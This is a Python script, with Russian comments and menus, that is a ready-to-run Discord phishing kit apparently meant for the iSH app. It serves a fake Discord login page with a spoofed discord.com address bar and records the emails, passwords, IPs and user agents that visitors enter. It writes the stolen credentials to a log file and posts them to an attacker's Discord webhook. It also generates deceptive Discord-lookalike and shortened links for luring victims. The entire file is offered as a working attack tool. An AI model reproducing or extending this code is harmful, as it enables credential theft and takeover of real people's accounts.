#!/usr/bin/env python3
# DISCORD PHISHING ДЛЯ ISH - С МЕНЮ НАСТРОЕК

import http.server
import socketserver
import json
import datetime
import threading
import time
import subprocess
import os
import random
import string
import sys

# ============================================
# ФАЙЛ ДЛЯ СОХРАНЕНИЯ НАСТРОЕК
# ============================================
CONFIG_FILE = '/sdcard/phish_config.json'
LOG_FILE = '/sdcard/discord_logs.txt'

# ============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С НАСТРОЙКАМИ
# ============================================

def load_config():
    """Загружает настройки из файла"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": "", "telegram_token": "", "telegram_chat": ""}

def save_config(config):
    """Сохраняет настройки в файл"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def show_menu():
    """Показывает меню настроек"""
    config = load_config()
    
    while True:
        print("\n" + "="*60)
        print("⚙️  МЕНЮ НАСТРОЕК PHISHING")
        print("="*60)
        print(f"1. Установить Discord Webhook (текущий: {config['webhook'][:30]}...)" if config['webhook'] else "1. Установить Discord Webhook (не настроен)")
        print(f"2. Установить Telegram Bot (текущий: {config['telegram_token'][:15]}...)" if config['telegram_token'] else "2. Установить Telegram Bot (не настроен)")
        print("3. Просмотреть все сохраненные данные")
        print("4. Очистить файл с данными")
        print("5. Запустить фишинг сервер")
        print("0. Выход")
        print("="*60)
        
        choice = input("Выберите действие: ").strip()
        
        if choice == "1":
            new_webhook = input("Введите Discord Webhook URL: ").strip()
            if new_webhook:
                config['webhook'] = new_webhook
                save_config(config)
                print("✅ Webhook сохранен!")
        
        elif choice == "2":
            token = input("Введите Telegram Bot Token: ").strip()
            chat = input("Введите Telegram Chat ID: ").strip()
            if token and chat:
                config['telegram_token'] = token
                config['telegram_chat'] = chat
                save_config(config)
                print("✅ Telegram настройки сохранены!")
        
        elif choice == "3":
            view_logs()
        
        elif choice == "4":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print("✅ Логи очищены!")
            else:
                print("❌ Файл с логами не найден")
        
        elif choice == "5":
            if not config['webhook']:
                print("❌ Сначала настрой Discord Webhook!")
                continue
            start_phishing_server(config)
        
        elif choice == "0":
            print("Выход...")
            sys.exit(0)

def view_logs():
    """Просмотр сохраненных логов"""
    if not os.path.exists(LOG_FILE):
        print("❌ Логов пока нет")
        return
    
    try:
        with open(LOG_FILE, 'r') as f:
            logs = f.readlines()
        
        print("\n" + "="*60)
        print(f"📁 СОХРАНЕННЫЕ ДАННЫЕ ({len(logs)} записей)")
        print("="*60)
        
        for i, log in enumerate(logs[-10:], 1):  # Показываем последние 10
            try:
                data = json.loads(log.strip())
                print(f"\n{i}. Email: {data.get('email', 'N/A')}")
                print(f"   Пароль: {data.get('password', 'N/A')}")
                print(f"   IP: {data.get('ip', 'N/A')}")
                print(f"   Время: {data.get('timestamp', 'N/A')}")
                print("-"*40)
            except:
                print(f"   {log.strip()}")
        
        print("="*60)
    except Exception as e:
        print(f"❌ Ошибка чтения логов: {e}")

# ============================================
# ФУНКЦИЯ ДЛЯ СОЗДАНИЯ МАСКИРОВАННЫХ ССЫЛОК
# ============================================

def generate_masked_links(real_url):
    """Генерирует маскированные ссылки под Discord"""
    
    # Варианты маскировки
    masks = [
        # Discord-style links
        f"https://discord.com-gifts.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
        f"https://discordapp.com-nitro.{''.join(random.choices(string.ascii_lowercase, k=5))}.com",
        f"https://discord.gift.{''.join(random.choices(string.ascii_lowercase, k=6))}.ru",
        f"https://discord.com-login.{''.join(random.choices(string.ascii_lowercase, k=7))}.com",
        f"https://discord-security.com/{''.join(random.choices(string.ascii_lowercase, k=10))}",
        f"https://discord-verify.{''.join(random.choices(string.ascii_lowercase, k=5))}.net",
        f"https://discord-nitro.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
        f"https://discord.com.verify.ru/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        
        # Через сокращатели ссылок
        f"https://bit.ly/3{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}",
        f"https://tinyurl.com/discord-{''.join(random.choices(string.ascii_lowercase, k=5))}",
        f"https://clck.ru/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}",
        f"https://rb.gy/{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}",
        f"https://cutt.ly/discord_{''.join(random.choices(string.ascii_lowercase, k=4))}",
        
        # Через сервисы с Discord в URL
        f"https://discord.gg/{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}",
        f"https://discord.media/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        f"https://discord.gifts/{''.join(random.choices(string.ascii_uppercase, k=8))}",
        
        # НитроПодарки
        f"https://discord.com/nitro/{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}",
        f"https://discordapp.com/gifts/{''.join(random.choices(string.ascii_lowercase, k=10))}",
    ]
    
    return masks

# ============================================
# HTML СТРАНИЦА - ТОЧНАЯ КОПИЯ DISCORD
# ============================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #5865F2;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: #313338;
            width: 480px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        .fake-url {
            background: #1E1F22;
            color: #B5BAC1;
            padding: 8px 12px;
            border-radius: 4px 4px 0 0;
            font-size: 12px;
            border-bottom: 1px solid #3C3F45;
            margin-bottom: 16px;
        }
        .fake-url span {
            color: #00A8FC;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo svg {
            width: 130px;
            height: 36px;
        }
        .title {
            color: #F2F3F5;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #B5BAC1;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            color: #B5BAC1;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            display: block;
            margin-bottom: 8px;
        }
        input {
            background: #1E1F22;
            border: 1px solid #1E1F22;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            color: #F2F3F5;
            font-size: 16px;
        }
        input:focus {
            border-color: #5865F2;
            outline: none;
        }
        button {
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 8px;
        }
        button:hover {
            background: #4752C4;
        }
        .qr-link {
            text-align: center;
            margin: 16px 0;
        }
        .qr-link a {
            color: #00A8FC;
            text-decoration: none;
            font-size: 14px;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            font-size: 14px;
        }
        .footer a {
            color: #00A8FC;
            text-decoration: none;
        }
        .error {
            background: #F23F42;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        .success {
            background: #248046;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fake-url">
            🔒 <span>https://</span>discord.com/login
        </div>
        
        <div class="logo">
            <svg viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="20" fill="#5865F2"/>
                <path d="M27 16L23.5 16 23.5 14.5C23.5 12.5 21.5 12.5 21.5 12.5L18.5 12.5C18.5 12.5 16.5 12.5 16.5 14.5L16.5 16 13 16 13 27 27 27 27 16zM18 19C18 19 18 19 18 19 17 19 16 18 16 17 16 16 17 15 18 15 19 15 20 16 20 17 20 18 19 19 18 19zM22 19C22 19 22 19 22 19 21 19 20 18 20 17 20 16 21 15 22 15 23 15 24 16 24 17 24 18 23 19 22 19z" fill="white"/>
            </svg>
        </div>
        <div class="title">Добро пожаловать!</div>
        <div class="subtitle">Войдите в свой аккаунт Discord</div>
        
        <div class="error" id="errorMsg">Неверный логин или пароль</div>
        <div class="success" id="successMsg">Успешный вход! Перенаправление...</div>
        
        <form id="loginForm" onsubmit="event.preventDefault(); login();">
            <div class="input-group">
                <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
                <input type="text" id="email" placeholder="example@mail.com" required>
            </div>
            <div class="input-group">
                <label>ПАРОЛЬ</label>
                <input type="password" id="password" placeholder="············" required>
            </div>
            <button type="submit">Войти</button>
        </form>
        
        <div class="qr-link">
            <a href="#">Войти через QR-код</a>
        </div>
        
        <div class="footer">
            <span style="color:#B5BAC1;">Нужна помощь?</span>
            <a href="#">Зарегистрироваться</a>
        </div>
    </div>

    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            
            if (!email || !password) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Заполните все поля';
                return;
            }
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        userAgent: navigator.userAgent,
                        time: new Date().toLocaleString()
                    })
                });
                
                if (response.ok) {
                    errorMsg.style.display = 'none';
                    successMsg.style.display = 'block';
                    
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/login';
                    }, 2000);
                }
            } catch (e) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Ошибка соединения';
            }
        }
    </script>
</body>
</html>"""

# ============================================
# HTTP HANDLER С ОТПРАВКОЙ В WEBHOOK
# ============================================

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    webhook_url = ""
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Добавляем IP и время
            data['ip'] = self.client_address[0]
            data['timestamp'] = str(datetime.datetime.now())
            
            # ВЫВОД В КОНСОЛЬ
            print("\n" + "="*60)
            print("🔴 ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ!")
            print("="*60)
            print(f"📧 Email: {data['email']}")
            print(f"🔑 Пароль: {data['password']}")
            print(f"🌐 IP: {data['ip']}")
            print(f"🕐 Время: {data['timestamp']}")
            print(f"📱 User-Agent: {data.get('userAgent', 'N/A')[:50]}...")
            print("="*60)
            
            # СОХРАНЕНИЕ В ФАЙЛ
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(data) + '\n')
            print(f"💾 Сохранено в: {LOG_FILE}")
            
            # ОТПРАВКА В DISCORD WEBHOOK
            if self.webhook_url:
                self.send_to_discord(data)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def send_to_discord(self, data):
        """Отправка данных в Discord Webhook"""
        try:
            import requests
            
            # Форматируем сообщение
            webhook_data = {
                "content": "",  # Пустой content для embed
                "embeds": [{
                    "title": "🔴 НОВЫЙ ЛОГИН DISCORD",
                    "color": 15548997,
                    "fields": [
                        {
                            "name": "📧 Email/Логин",
                            "value": f"```{data['email']}```",
                            "inline": False
                        },
                        {
                            "name": "🔑 Пароль",
                            "value": f"```{data['password']}```",
                            "inline": False
                        },
                        {
                            "name": "🌐 IP Адрес",
                            "value": f"```{data['ip']}```",
                            "inline": True
                        },
                        {
                            "name": "🕐 Время",
                            "value": f"```{data['timestamp']}```",
                            "inline": True
                        },
                        {
                            "name": "📱 User Agent",
                            "value": f"```{data.get('userAgent', 'N/A')[:100]}...```",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": f"Phishing Server | {data['ip']}"
                    }
                }]
            }
            
            response = requests.post(self.webhook_url, json=webhook_data)
            if response.status_code == 204:
                print("✅ Отправлено в Discord Webhook")
            else:
                print(f"❌ Ошибка отправки в Discord: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Ошибка отправки в Discord: {e}")

# ============================================
# ЗАПУСК СЕРВЕРА
# ============================================

def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def start_phishing_server(config):
    """Запуск фишинг сервера"""
    PORT = 8080
    
    print("\n" + "="*60)
    print("🚀 ЗАПУСК ФИШИНГ СЕРВЕРА")
    print("="*60)
    
    # Устанавливаем webhook для обработчика
    PhishingHandler.webhook_url = config['webhook']
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    
    print(f"\n📌 Локальные ссылки:")
    print(f"   http://localhost:{PORT}")
    print(f"   http://{local_ip}:{PORT}")
    
    # Генерируем маскированные ссылки
    print("\n🎭 Маскированные ссылки для отправки:")
    masked_links = generate_masked_links(f"http://{local_ip}:{PORT}")
    for i, link in enumerate(masked_links[:15], 1):
        print(f"{i:2d}. {link}")
    
    print("\n" + "="*60)
    print("⏳ Сервер запущен. Ожидание данных...")
    print("📁 Логи сохраняются в: " + LOG_FILE)
    print("="*60 + "\n")
    
    # Запускаем сервер
    handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n❌ Сервер остановлен")
            httpd.shutdown()

# ============================================
# ТОЧКА ВХОДА
# ============================================

if __name__ == '__main__':
    # Создаем папку для логов если нужно
    os.makedirs('/sdcard', exist_ok=True)
    
    print("""
    ╔══════════════════════════════════════════╗
    ║   DISCORD PHISHING ДЛЯ ISH v3.0          ║
    ║   С МЕНЮ ВВОДА WEBHOOK                   ║
    ║        by LEDIAN PREMIUM                 ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Показываем меню
    show_menu()
